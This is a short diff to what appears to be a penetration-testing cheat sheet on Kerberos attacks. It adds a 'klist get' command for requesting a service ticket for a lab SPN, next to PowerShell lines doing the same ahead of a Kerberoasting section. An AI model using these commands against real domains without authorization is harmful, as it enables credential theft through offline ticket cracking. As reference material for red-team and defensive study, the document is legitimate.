@@ -31,6 +31,10 @@ Using native Powershell:
 PS C:\> Add-Type -AssemblyName System.IdentityModel  
 PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/websrv.domain.local"
 ```
+Get Kerberos ticket for provided SPN into current users kerberos ticket cache (using lolbin):    
+```
+klist get http/server1.testlab.local
+```
 # Kerberos Attacks
 ## Kerberoasting
 ### From Windows
